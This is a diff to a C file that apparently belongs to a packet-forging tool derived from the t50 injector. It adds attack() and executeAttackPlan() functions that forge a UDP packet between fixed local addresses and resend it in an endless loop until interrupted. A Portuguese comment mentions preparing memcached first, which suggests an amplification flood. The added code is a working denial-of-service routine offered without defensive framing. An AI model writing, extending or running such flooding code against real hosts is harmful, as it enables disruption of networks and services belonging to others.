@@ -1,15 +1,44 @@
-
-
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
-
+#include <signal.h>
 #include "c.h"
-#include "netio.h"
+#include "PacketForge.h"
+#include "strix.h"
 
-int create_socket( void )
+
+volatile sig_atomic_t stop = 1;
+
+static void sigint_handler( int signum )
+{
+  stop = 0;
+  fprintf(stdout, "\nShutdown signal received\n");
+}
+
+static void 
+attack( Packet * pkt )
+{
+  signal(SIGINT, sigint_handler);
+  
+  //Precisamos inserir os dados no memcached antes de iniciar o ataque
+  while( likely(stop) ){
+    send_packet( pkt ); 
+  }
+}
+
+void 
+executeAttackPlan( AttackPlan * plan )
+{
+  Packet * pkt = forgeUDP("192.168.0.145", "192.168.0.1", 6666);
+  attack( pkt );
+  release_packet( pkt );
+}
+
+/*Code inspired on t50 */
+int 
+create_socket( void )
 {
   int fd, flag;
   uint32_t n = 1;
@@ -42,8 +71,9 @@ int create_socket( void )
   return fd;
 }
 
-
-void close_socket( int fd)
+/* Taken from t50 */
+void 
+close_socket( int fd)
 {
   /* Close only if the descriptor is valid. */
   if (fd > 0)
@@ -54,3 +84,18 @@ void close_socket( int fd)
     fd = -1;
   }
 }
+
+bool 
+send_packet( Packet * pkt)
+{
+  assert(NULL != pkt);
+
+
+  if( unlikely( sendto(pkt->socket, pkt->packet_ptr, pkt->size, MSG_NOSIGNAL, (struct sockaddr *)&pkt->sin, sizeof(struct sockaddr_in)) == -1 ) ){
+    return false;
+  }
+
+  return true;
+}
+
+
